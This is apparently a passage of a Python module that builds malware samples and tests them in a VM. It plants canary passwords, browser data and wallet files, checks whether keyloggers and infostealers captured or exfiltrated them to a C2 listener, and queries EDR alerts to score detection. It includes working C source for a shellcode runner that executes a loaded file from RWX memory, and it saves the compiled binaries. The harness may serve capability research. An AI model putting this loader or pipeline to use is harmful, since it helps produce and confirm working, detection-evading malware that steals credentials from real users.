            r'echo CANARY_WALLET_DATA > "C:\Users\vmuser\Documents\credentials\wallet.dat"',
        ]
        for cmd in setup_cmds:
            try:
                await self._vm.execute_command(cmd, timeout=10)
            except Exception:
                pass
        logger.info("Infostealer canaries planted (fake creds, browser data, env vars) — C2 target: %s:%d",
                    c2_addr, c2_port)

    # ------------------------------------------------------------------
    # Per-type behavioral checks
    # ------------------------------------------------------------------

    async def _check_keylogger_behaviour(self, result: VerificationResult, spec):
        """Post-execution checks for keylogger: did it capture keystrokes?

        After the exe launches, we simulate keystrokes via PowerShell and then
        check for evidence of keystroke capture (log files, network exfil).
        """
        _strong_evidence = []
        _weak_evidence = []
        c2_addr = getattr(spec, "c2_address", "10.0.2.2")
        c2_port = getattr(spec, "c2_port", 9001)

        # 1. Simulate keystrokes for the keylogger to capture
        _KEYSTROKE_CANARY = "CANARY_KEYLOG_TEST_STRING_XYZ"
        try:
            await self._vm.execute_command(
                'powershell -NoProfile -Command "'
                'Add-Type -AssemblyName System.Windows.Forms; '
                'Start-Sleep -Milliseconds 2000; '
                f'[System.Windows.Forms.SendKeys]::SendWait(\'{_KEYSTROKE_CANARY}\')"',
                timeout=15,
            )
            logger.info("Keystroke simulation sent: %s", _KEYSTROKE_CANARY)
            await asyncio.sleep(5)
        except Exception as exc:
            logger.warning("Keystroke simulation failed: %s", exc)

        # 2. Search for keylog output files anywhere in user profile
        log_search_cmd = (
            'cmd /c "dir /s /b C:\\Users\\vmuser\\*.log C:\\Users\\vmuser\\*.txt '
            'C:\\Users\\vmuser\\*.dat C:\\Users\\vmuser\\*.keylog 2>NUL '
            '| findstr /v /i /c:\"canary\" /c:\"pre_marker\" /c:\"NTUSER\" /c:\"desktop.ini\""'
        )
        try:
            log_files = (await self._vm.execute_command(log_search_cmd, timeout=10)).strip()
            if log_files:
                for lf in log_files.splitlines()[:5]:
                    lf = lf.strip()
                    if not lf:
                        continue
                    try:
                        content = (await self._vm.execute_command(
                            f'cmd /c "type "{lf}" 2>NUL"', timeout=8
                        )).strip()
                        if _KEYSTROKE_CANARY.lower() in content.lower():
                            _strong_evidence.append(f"keylog_captured:{lf}")
                            logger.info("Keylogger captured canary text in %s", lf)
                        elif len(content) > 20:
                            _weak_evidence.append(f"suspicious_log:{lf}")
                    except Exception:
                        pass
        except Exception as exc:
            logger.debug("Keylog file search failed: %s", exc)

        # 3. Check for network exfiltration to C2
        try:
            net_cmd = (
                f'powershell -NoProfile -Command "'
                f'Get-NetTCPConnection -RemoteAddress {c2_addr} -ErrorAction SilentlyContinue '
                f'| Select-Object -Property RemoteAddress,RemotePort,State -First 5 '
                f'| Format-Table -AutoSize"'
            )
            net_out = (await self._vm.execute_command(net_cmd, timeout=10)).strip()
            if c2_addr in net_out:
                _strong_evidence.append(f"network_exfil:{c2_addr}")
                logger.info("Network connection to C2 detected: %s", net_out[:200])
        except Exception:
            pass

        # 4. Check if keyboard hook is installed (SetWindowsHookEx)
        try:
            hook_out = (await self._vm.execute_command(
                'powershell -NoProfile -Command "'
                'Get-Process | Where-Object {$_.Modules.ModuleName -contains \'user32.dll\'} '
                '| Where-Object {$_.ProcessName -eq \'malware_test\'} '
                '| Select-Object ProcessName,Id"',
                timeout=10
            )).strip()
            if "malware_test" in hook_out:
                _weak_evidence.append("process_with_user32")
        except Exception:
            pass

        if _strong_evidence:
            result.behaviour_checks[BehaviourCheck.FUNCTIONAL_GOAL_MET] = True
            result.execution_output += f"\n[BEHAVIOUR] CONFIRMED: {', '.join(_strong_evidence)}"
            if _weak_evidence:
                result.execution_output += f" (also: {', '.join(_weak_evidence)})"
            logger.info("Keylogger behaviour CONFIRMED: %s", _strong_evidence)
        else:
            result.behaviour_checks[BehaviourCheck.FUNCTIONAL_GOAL_MET] = False
            result.execution_output += "\n[BEHAVIOUR] FAILED: No keystroke capture evidence"
            if _weak_evidence:
                result.execution_output += f" (weak only: {', '.join(_weak_evidence)})"
            logger.warning("Keylogger behaviour NOT confirmed — no keylog files or network exfil detected")

    async def _check_infostealer_behaviour(self, result: VerificationResult, spec,
                                            c2_data_file: Optional[Path] = None):
        """Post-execution checks for infostealer: did it collect/exfiltrate data?

        Ground truth check: the C2 listener saved received data to c2_data_file.
        We check if that file contains our planted canary credentials.
        Also checks for on-disk collection artifacts and credential file access.
        """
        _strong_evidence = []
        _weak_evidence = []
        c2_addr = getattr(spec, "c2_address", "10.0.2.2")
        c2_port = getattr(spec, "c2_port", 9001)

        # -- Ground truth: check C2 received data for canary strings --
        _CANARY_MARKERS = [
            b"SuperSecret123",
            b"AKIA_FAKE_KEY",
            b"CANARY_BROWSER_DATA",
        ]
        _c2_data = b""
        if c2_data_file and c2_data_file.exists():
            _c2_data = c2_data_file.read_bytes()
            _c2_size = len(_c2_data)
            logger.info("C2 received %d bytes of exfiltrated data", _c2_size)
            if _c2_size > 0:
                _weak_evidence.append(f"c2_data_received:{_c2_size}b")
            _canary_hits = 0
            for marker in _CANARY_MARKERS:
                if marker in _c2_data:
                    _canary_hits += 1
                    _strong_evidence.append(f"c2_contains_canary:{marker.decode()}")
                    logger.info("C2 data contains planted canary: %s", marker.decode())
            if _canary_hits == 0 and _c2_size > 10:
                _weak_evidence.append("c2_data_no_canary_match")
                logger.info("C2 received data but no canary markers found (may be encrypted/encoded)")
        else:
            logger.info("No C2 data received (file missing or empty)")

        # -- Check if planted credential files were accessed/modified/deleted --
        _CRED_PATHS = [
            r"C:\Users\vmuser\Documents\credentials\passwords.txt",
            r"C:\Users\vmuser\AppData\Local\Google\Chrome\User Data\Default\Login Data",
            r"C:\Users\vmuser\Documents\credentials\wallet.dat",
        ]
        for cred_path in _CRED_PATHS:
            try:
                out = (await self._vm.execute_command(
                    f'cmd /c "if exist ""{cred_path}"" (echo EXISTS) else (echo GONE)"',
                    timeout=8
                )).strip()
                if "GONE" in out:
                    _strong_evidence.append(f"cred_stolen:{cred_path.split(chr(92))[-1]}")
                    logger.info("Credential file removed (exfiltrated): %s", cred_path)
            except Exception:
                pass

        # -- Check for on-disk collection artifacts --
        collect_cmd = (
            'cmd /c "dir /s /b C:\\Users\\vmuser\\AppData\\Local\\Temp\\*.txt '
            'C:\\Users\\vmuser\\AppData\\Local\\Temp\\*.dat '
            'C:\\Users\\vmuser\\AppData\\Local\\Temp\\*.log '
            'C:\\Users\\vmuser\\AppData\\Local\\Temp\\*.tmp 2>NUL '
            '| findstr /v /i /c:\"canary\""'
        )
        try:
            out = (await self._vm.execute_command(collect_cmd, timeout=10)).strip()
            if out and "File Not Found" not in out:
                for f in out.splitlines()[:3]:
                    fname = f.strip().split("\\")[-1] if "\\" in f else f.strip()
                    _weak_evidence.append(f"temp_artifact:{fname}")
                logger.info("Temp collection files found: %s", out[:300])
        except Exception:
            pass

        # -- Check hostname/username in C2 data (system info was gathered) --
        if _c2_data:
            try:
                hostname_out = (await self._vm.execute_command("hostname", timeout=5)).strip()
                if hostname_out.encode() in _c2_data:
                    _strong_evidence.append(f"c2_contains_hostname:{hostname_out}")
                    logger.info("C2 data contains hostname: %s", hostname_out)
                username_out = (await self._vm.execute_command("whoami", timeout=5)).strip()
                if username_out.encode() in _c2_data or b"vmuser" in _c2_data:
                    _strong_evidence.append("c2_contains_username")
                    logger.info("C2 data contains username")
            except Exception:
                pass

        # -- Check for network connection evidence to C2 --
        try:
            net_cmd = f'netstat -an | findstr "{c2_addr}" | findstr "{c2_port}"'
            net_out = (await self._vm.execute_command(net_cmd, timeout=10)).strip()
            if net_out:
                _weak_evidence.append(f"network_connection:{c2_addr}:{c2_port}")
                logger.info("Network connection to C2 detected: %s", net_out[:200])
        except Exception:
            pass

        # -- Verdict --
        if _strong_evidence:
            result.behaviour_checks[BehaviourCheck.FUNCTIONAL_GOAL_MET] = True
            result.execution_output += f"\n[BEHAVIOUR] CONFIRMED: {', '.join(_strong_evidence)}"
            if _weak_evidence:
                result.execution_output += f" (also: {', '.join(_weak_evidence)})"
            logger.info("Infostealer behaviour CONFIRMED: %s", _strong_evidence)
        else:
            result.behaviour_checks[BehaviourCheck.FUNCTIONAL_GOAL_MET] = False
            result.execution_output += "\n[BEHAVIOUR] FAILED: No data theft evidence detected"
            if _weak_evidence:
                result.execution_output += f" (weak only: {', '.join(_weak_evidence)})"
            logger.warning(
                "Infostealer behaviour NOT confirmed — no canary data in C2 stream, "
                "no stolen credential files, no collection artifacts."
            )

    def _extract_mingw_flags(self, compiler_instructions: str) -> str:
        """Pull any -l or -D flags out of the compiler instructions block."""
        flags = []
        for line in compiler_instructions.splitlines():
            line = line.strip()
            if line.startswith("-l") or line.startswith("-D") or line.startswith("-W"):
                flags.append(line)
            elif " -l" in line:
                # e.g. "x86_64-w64-mingw32-gcc ... -lws2_32 -ladvapi32"
                for tok in line.split():
                    if tok.startswith("-l") or tok.startswith("-D"):
                        flags.append(tok)
        return " ".join(dict.fromkeys(flags))  # deduplicate, preserve order

    async def _upload_shellcode_runner(self, workdir: str) -> None:
        """Compile and upload a minimal shellcode runner to the VM.

        The runner reads a .bin file, allocates RWX memory via VirtualAlloc,
        copies the shellcode in, and executes it via CreateThread.
        """
        _SC_RUNNER_SRC = r'''
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc < 2) { return 1; }
    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { return 2; }
    DWORD sz = GetFileSize(hFile, NULL);
    if (sz == 0 || sz == INVALID_FILE_SIZE) { CloseHandle(hFile); return 3; }
    LPVOID mem = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!mem) { CloseHandle(hFile); return 4; }
    DWORD rd = 0;
    ReadFile(hFile, mem, sz, &rd, NULL);
    CloseHandle(hFile);
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    if (hThread) { WaitForSingleObject(hThread, INFINITE); }
    return 0;
}
'''
        td = Path(workdir)
        runner_src = td / "sc_runner.c"
        runner_exe = td / "sc_runner.exe"
        runner_src.write_text(_SC_RUNNER_SRC)

        mingw = shutil.which("x86_64-w64-mingw32-gcc")
        if not mingw:
            logger.warning("Cannot compile shellcode runner — mingw not found")
            return

        cmd = f"{mingw} -O2 -s -static -m64 {runner_src} -o {runner_exe} 2>&1"
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        stdout, _ = await proc.communicate()
        if proc.returncode != 0:
            logger.warning("Shellcode runner compilation failed: %s",
                           stdout.decode("utf-8", errors="replace"))
            return

        remote_runner = r"C:\Users\vmuser\sc_runner.exe"
        await self._vm.upload_file(str(runner_exe), remote_runner)
        logger.info("Shellcode runner uploaded to %s", remote_runner)

    # ------------------------------------------------------------------
    # Linux path
    # ------------------------------------------------------------------

    async def _verify_linux(self, result, source_code, spec,
                             compiler_instructions, timeout):
        remote_src = "/tmp/malware_src.c"
        remote_bin = "/tmp/malware_bin"

        # Step 1: upload source via SFTP
        with tempfile.NamedTemporaryFile(suffix=".c", delete=False, mode="w") as f:
            f.write(source_code)
            tmp_src = f.name
        try:
            await self._vm.upload_file(tmp_src, remote_src)
        finally:
            Path(tmp_src).unlink(missing_ok=True)

        if self._debug:
            self._debug.step("vfy_1_upload", f"Source uploaded → {remote_src}")

        # Step 2: compile on VM
        compile_cmd = self._build_linux_compile_cmd(compiler_instructions, remote_src, remote_bin)
        compile_out = await self._vm.execute_command(compile_cmd, timeout=60)
        result.compilation_output = compile_out
        failed = "error:" in compile_out.lower() or "undefined reference" in compile_out.lower()
        result.behaviour_checks[BehaviourCheck.COMPILATION_SUCCESS] = not failed

        if self._debug:
            self._debug.step("vfy_2_compile", f"Compile {'ok' if not failed else 'FAILED'}")

        if failed:
            return

        # Step 3: execute
        exec_cmd = f"{remote_bin} & sleep 0.1; echo $?"
        exec_out = await self._vm.execute_command(exec_cmd, timeout=timeout)
        result.execution_output = exec_out
        lines = [l.strip() for l in exec_out.strip().splitlines()]
        if lines and lines[-1].isdigit():
            result.execution_exit_code = int(lines[-1])

    def _build_linux_compile_cmd(self, instructions: str, src: str, out: str) -> str:
        for line in (instructions or "").splitlines():
            s = line.strip()
            if s and not s.startswith("#") and any(x in s for x in ["gcc", "clang", "cc "]):
                return s
        return f"gcc -O2 -Wall {src} -o {out} 2>&1 || g++ -O2 {src} -o {out} 2>&1"

    # ------------------------------------------------------------------
    # EDR / behaviour / sandbox
    # ------------------------------------------------------------------

    async def _check_edr_alerts(self, spec, is_windows: bool, edr_config=None) -> list[AlertRecord]:
        if edr_config is not None:
            return await self._check_edr_detection(edr_config)

        alerts = []
        try:
            if is_windows:
                cmd = (
                    'powershell -NoProfile -Command '
                    '"Get-WinEvent -LogName Microsoft-Windows-Windows-Defender/Operational '
                    '-MaxEvents 20 -ErrorAction SilentlyContinue | '
                    'Where-Object { $_.Id -in 1116,1117,1006,1007 } | '
                    'Select-Object -ExpandProperty Message"'
                )
            else:
                cmd = "grep -i 'malware_bin\\|trojan\\|suspicious' /var/log/syslog 2>/dev/null || echo 'no alerts'"
            output = await self._vm.execute_command(cmd, timeout=30)
            if output.strip() and "no alerts" not in output.lower():
                _msg_block = output.strip()
                _threat_name = ""
                _category = ""
                _severity = "high" if is_windows else "info"
                if is_windows:
                    import re as _re
                    _nm = _re.search(r"Name:\s*(.+?)(?:\r?\n|$)", _msg_block)
                    _cat = _re.search(r"Category:\s*(.+?)(?:\r?\n|$)", _msg_block)
                    _sev = _re.search(r"Severity:\s*(.+?)(?:\r?\n|$)", _msg_block)
                    if _nm:
                        _threat_name = _nm.group(1).strip()
                    if _cat:
                        _category = _cat.group(1).strip()
                    if _sev:
                        _severity = _sev.group(1).strip().lower()
                alerts.append(AlertRecord(
                    edr_name="windows_defender" if is_windows else "syslog",
                    alert_type="detection",
                    severity=_severity,
                    process_path="malware_test.exe" if is_windows else "/tmp/malware_bin",
                    timestamp_offset=0,
                    message=_msg_block[:2000],
                    rule_name=_threat_name,
                    detection_category=_category,
                ))
        except Exception as e:
            logger.warning("EDR alert check failed: %s", e)
        return alerts

    async def _check_edr_detection(self, edr_config) -> list[AlertRecord]:
        """Pluggable EDR detection — dispatches on edr_config.detection_method."""
        alerts = []
        method = getattr(edr_config, "detection_method", "ssh_command")
        name = getattr(edr_config, "name", "unknown")

        try:
            if method == "rest_api":
                alerts = await self._check_edr_rest_api(edr_config)
            elif method == "elasticsearch":
                alerts = await self._check_edr_elasticsearch(edr_config)
            elif method == "log_file":
                alerts = await self._check_edr_log_file(edr_config)
            elif method == "ssh_command":
                alerts = await self._check_edr_ssh_command(edr_config)
            else:
                logger.warning("Unknown EDR detection method '%s' for %s", method, name)
        except Exception as e:
            logger.warning("EDR detection check failed for %s (%s): %s", name, method, e)

        return alerts

    async def _check_edr_rest_api(self, edr_config) -> list[AlertRecord]:
        """Query EDR via REST API (Wazuh, Velociraptor, Sophos, etc.)."""
        import aiohttp
        alerts = []
        url = edr_config.detection_api.rstrip("/")
        query_path = edr_config.alert_query
        full_url = f"{url}/{query_path.lstrip('/')}" if query_path else url

        auth = None
        if edr_config.api_auth:
            user = edr_config.api_auth.get("user", "")
            password = edr_config.api_auth.get("password", "")
            if user:
                auth = aiohttp.BasicAuth(user, password)

        async with aiohttp.ClientSession() as session:
            async with session.get(full_url, auth=auth, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    items = []
                    if isinstance(data, dict):
                        items = data.get("data", {}).get("affected_items", [])
                        if not items:
                            items = data.get("data", {}).get("items", [])
                        if not items and data.get("hits"):
                            items = data["hits"].get("hits", [])
                    for item in items:
                        sev = "high"
                        _msg = ""
                        _rule_name = ""
                        _det_cat = ""
                        if isinstance(item, dict):
                            rule = item.get("rule", {})
                            sev = str(rule.get("level", rule.get("severity", "high"))).lower()
                            if sev.isdigit():
                                sev = "high" if int(sev) >= 10 else "medium" if int(sev) >= 5 else "low"
                            _msg = str(rule.get("description", item.get("full_log", "")))[:2000]
                            _rule_name = str(rule.get("id", rule.get("name", "")))
                            _det_cat = str(rule.get("groups", [""]))
                        alerts.append(AlertRecord(
                            edr_name=edr_config.name,
                            alert_type="detection",
                            severity=sev,
                            process_path="malware_test.exe",
                            timestamp_offset=0,
                            message=_msg,
                            rule_name=_rule_name,
                            detection_category=_det_cat,
                        ))
                else:
                    logger.warning("EDR REST API returned %d for %s", resp.status, edr_config.name)

        return alerts

    async def _check_edr_elasticsearch(self, edr_config) -> list[AlertRecord]:
        """Query Elastic Security alerts via Elasticsearch API."""
        import aiohttp
        alerts = []
        base_url = edr_config.detection_api.rstrip("/")
        query_path = edr_config.alert_query or "/.alerts-security*/_search?size=20"

        auth = None
        if edr_config.api_auth:
            user = edr_config.api_auth.get("user", "")
            password = edr_config.api_auth.get("password", "")
            if user:
                auth = aiohttp.BasicAuth(user, password)

        full_url = f"{base_url}/{query_path.lstrip('/')}"

        async with aiohttp.ClientSession() as session:
            async with session.get(full_url, auth=auth, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    hits = data.get("hits", {}).get("hits", [])
                    for hit in hits:
                        src = hit.get("_source", {})
                        _signal = src.get("signal", {})
                        _rule = _signal.get("rule", {})
                        sev = src.get("kibana.alert.severity", _rule.get("severity", "high"))
                        _msg = str(_rule.get("description", src.get("message", "")))[:2000]
                        _rule_name = str(_rule.get("name", _rule.get("id", "")))
                        _det_cat = str(_rule.get("type", ""))
                        alerts.append(AlertRecord(
                            edr_name=edr_config.name,
                            alert_type="detection",
                            severity=str(sev).lower(),
                            process_path=src.get("process", {}).get("executable", "malware_test.exe"),
                            timestamp_offset=0,
                            message=_msg,
                            rule_name=_rule_name,
                            detection_category=_det_cat,
                        ))

        return alerts

    async def _check_edr_log_file(self, edr_config) -> list[AlertRecord]:
        """Parse JSON event log on the VM via SSH (OpenEDR, WHIDS)."""
        alerts = []
        log_path = edr_config.detection_api or r"C:\ProgramData\OpenEDR\events.json"
        cmd = f'type "{log_path}" 2>NUL'
        output = await self._vm.execute_command(cmd, timeout=15)

        if output.strip():
            import json as _json
            for line in output.strip().splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    entry = _json.loads(line)
                    if any(k in str(entry).lower() for k in ("alert", "detection", "threat", "malicious")):
                        _entry_str = _json.dumps(entry, indent=2)[:2000]
                        alerts.append(AlertRecord(
                            edr_name=edr_config.name,
                            alert_type=entry.get("type", "detection"),
                            severity=entry.get("severity", "medium"),
                            process_path=entry.get("process", {}).get("path", "malware_test.exe") if isinstance(entry.get("process"), dict) else "malware_test.exe",
                            timestamp_offset=0,
                            message=_entry_str,
                            rule_name=str(entry.get("rule", {}).get("name", entry.get("detection", ""))),
                            detection_category=str(entry.get("category", entry.get("type", ""))),
                        ))
                except (ValueError, TypeError):
                    if any(k in line.lower() for k in ("alert", "detection", "threat")):
                        alerts.append(AlertRecord(
                            edr_name=edr_config.name,
                            alert_type="detection",
                            severity="medium",
                            process_path="malware_test.exe",
                            timestamp_offset=0,
                            message=line[:2000],
                        ))

        return alerts

    async def _check_edr_ssh_command(self, edr_config) -> list[AlertRecord]:
        """Run a custom SSH command to check for detections (Defender, custom scripts)."""
        alerts = []
        cmd = edr_config.alert_query
        if not cmd:
            return alerts

        output = await self._vm.execute_command(cmd, timeout=30)
        if output.strip() and "no alerts" not in output.lower():
            _full_output = output.strip()
            import re as _re
            _threat_name = ""
            _category = ""
            _nm = _re.search(r"Name:\s*(.+?)(?:\r?\n|$)", _full_output)
            _cat = _re.search(r"Category:\s*(.+?)(?:\r?\n|$)", _full_output)
            if _nm:
                _threat_name = _nm.group(1).strip()
            if _cat:
                _category = _cat.group(1).strip()
            alerts.append(AlertRecord(
                edr_name=edr_config.name,
                alert_type="detection",
                severity="high",
                process_path="malware_test.exe",
                timestamp_offset=0,
                message=_full_output[:2000],
                rule_name=_threat_name,
                detection_category=_category,
            ))

        return alerts

    async def _run_behaviour_checks(self, result: VerificationResult, spec, is_windows: bool) -> None:
        checks = {}
        try:
            if is_windows:
                stat_out = await self._vm.execute_command(
                    r'if exist "C:\Users\vmuser\malware_test.exe" (echo exists) else (echo missing)',
                    timeout=10,
                )
                checks[BehaviourCheck.EXECUTION_SUCCESS] = "exists" in stat_out
                net_out = await self._vm.execute_command(
                    "netstat -ano | findstr ESTABLISHED", timeout=10
                )
                checks[BehaviourCheck.LAUNCHES_NETWORK] = bool(net_out.strip())
                checks[BehaviourCheck.SPLASH_WINDOW] = True  # placeholder
            else:
                stat_out = await self._vm.execute_command(
                    "test -x /tmp/malware_bin && echo exists || echo missing", timeout=10
                )
                checks[BehaviourCheck.EXECUTION_SUCCESS] = stat_out.strip() == "exists"
                net_out = await self._vm.execute_command(
                    "ss -tunp 2>/dev/null | grep malware_bin || echo no_net", timeout=5
                )
                checks[BehaviourCheck.LAUNCHES_NETWORK] = "no_net" not in net_out.lower()
        except Exception as e:
            logger.warning("Behaviour check failed: %s", e)
        result.behaviour_checks.update(checks)

    async def _check_sandbox(self, is_windows: bool) -> bool:
        indicators = []
        try:
            if is_windows:
                cpu_out = await self._vm.execute_command(
                    'powershell -NoProfile -Command '
                    '"(Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors"',
                    timeout=10,
                )
                if cpu_out.strip().isdigit() and int(cpu_out.strip()) < 2:
                    indicators.append("low_cpu")
                ram_out = await self._vm.execute_command(
                    'powershell -NoProfile -Command '
                    '"[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1MB)"',
                    timeout=10,
                )
                if ram_out.strip().isdigit() and int(ram_out.strip()) < 1000:
                    indicators.append("low_ram")
            else:
                cpu_out = await self._vm.execute_command("nproc 2>/dev/null || echo 0", timeout=5)
                if int(cpu_out.strip() or 0) < 2:
                    indicators.append("low_cpu")
                ram_out = await self._vm.execute_command(
                    "free -m 2>/dev/null | awk '/Mem:/{print $2}' || echo 0", timeout=5
                )
                if int(ram_out.strip() or 0) < 1000:
                    indicators.append("low_ram")
        except Exception as e:
            logger.warning("Sandbox check failed: %s", e)
        return len(indicators) > 0


# ---------------------------------------------------------------------------
# Standalone (no VM) — compile-check only
# ---------------------------------------------------------------------------

async def verify_standalone(
    source_code: str,
    target_spec,
    compile_cmd: Optional[str] = None,
    workdir: str = "/tmp",
    output_dir: Optional[Path] = None,
) -> VerificationResult:
    """Verify compilation on the local host without a VM (smoke-test mode)."""
    import tempfile as _tempfile
    import os as _os

    result = VerificationResult()

    win = _is_windows(target_spec)

    if compile_cmd and compile_cmd.startswith("go:build:"):
        return await _verify_standalone_go(
            source_code, target_spec, compile_cmd, workdir, output_dir,
        )

    if win:
        mingw = shutil.which("x86_64-w64-mingw32-gcc")
        compiler = compile_cmd or (
            f"{mingw} -fsyntax-only -x c" if mingw else None
        )
        if not compiler:
            result.compilation_output = "x86_64-w64-mingw32-gcc not found"
            return result
    else:
        compiler = compile_cmd or "gcc -O2 -Wall"

    syntax_only = "-fsyntax-only" in compiler

    src_fd, src_name = _tempfile.mkstemp(suffix=".c", dir=workdir)
    bin_fd, bin_name = (None, None) if syntax_only else _tempfile.mkstemp(dir=workdir)
    try:
        _os.close(src_fd)
        Path(src_name).write_text(source_code)
        if bin_fd is not None:
            _os.close(bin_fd)

        out_flag = "" if syntax_only else f"-o {bin_name}"
        shell_cmd = f"{compiler} {src_name} {out_flag}"

        logger.info("Compile command: %s", shell_cmd)
        try:
            proc = await asyncio.create_subprocess_shell(
                shell_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            stdout, _ = await proc.communicate()
            compiler_stdout = stdout.decode("utf-8", errors="replace")
            result.compilation_output = f"$ {shell_cmd}\n{compiler_stdout}"

            if proc.returncode == 0:
                result.behaviour_checks[BehaviourCheck.COMPILATION_SUCCESS] = True
                result.detection_score = DetectionLevel.NONE
                if not syntax_only and output_dir and bin_name:
                    _fmt = getattr(target_spec, "output_format", "exe")
                    _save_ext = {
                        "exe": ".exe", "dll": ".dll", "shellcode": ".bin",
                    }.get(_fmt, ".exe")
                    dest_out = Path(output_dir) / f"malware_source{_save_ext}"
                    shutil.copy2(bin_name, str(dest_out))
                    logger.info("Compiled %s saved to %s", _fmt, dest_out)
        except FileNotFoundError:
            result.compilation_output = f"compiler not found: {compiler}"
    finally:
        for p in (src_name, bin_name):
            if p:
                try:
                    _os.unlink(p)
                except OSError:
                    pass

    return result


async def _verify_standalone_go(
    source_code: str,
    target_spec,
    compile_cmd: str,
    workdir: str = "/tmp",
    output_dir: Optional[Path] = None,
) -> VerificationResult:
    """Compile-check Go source using go build in a temp module."""
    import tempfile as _tempfile
    import os as _os
    import subprocess

    result = VerificationResult()
    goos = compile_cmd.split(":")[-1]

    tmpdir = _tempfile.mkdtemp(prefix="go_verify_")
    src_path = Path(tmpdir) / "main.go"
    out_name = "test.exe" if goos == "windows" else "test"
    out_path = Path(tmpdir) / out_name

    try:
        src_path.write_text(source_code)
        subprocess.run(
            ["go", "mod", "init", "test"],
            capture_output=True, cwd=tmpdir, timeout=10,
        )
        env = {**_os.environ, "GOOS": goos, "GOARCH": "amd64", "CGO_ENABLED": "0"}
        shell_cmd = f"go build -ldflags='-s -w' -o {out_name} ."
        logger.info("Compile command (go): GOOS=%s %s", goos, shell_cmd)

        proc = await asyncio.create_subprocess_exec(
            "go", "build", "-ldflags=-s -w", "-o", str(out_path), ".",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            cwd=tmpdir, env=env,
        )
        stdout, _ = await proc.communicate()
        compiler_stdout = stdout.decode("utf-8", errors="replace")
        if proc.returncode != 0:
            result.compilation_output = f"error: go build failed (exit {proc.returncode})\n$ GOOS={goos} {shell_cmd}\n{compiler_stdout}"
        else:
            result.compilation_output = f"$ GOOS={goos} {shell_cmd}\n{compiler_stdout}"

        if proc.returncode == 0:
            result.behaviour_checks[BehaviourCheck.COMPILATION_SUCCESS] = True
            result.detection_score = DetectionLevel.NONE
            if output_dir and out_path.exists():
                _save_ext = ".exe" if goos == "windows" else ""
                dest_out = Path(output_dir) / f"malware_source{_save_ext}"
                shutil.copy2(str(out_path), str(dest_out))
                logger.info("Go binary saved to %s (%d bytes)", dest_out, out_path.stat().st_size)
    except FileNotFoundError:
        result.compilation_output = "go compiler not found"
    except Exception as exc:
        result.compilation_output = f"Go build error: {exc}"
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    return result
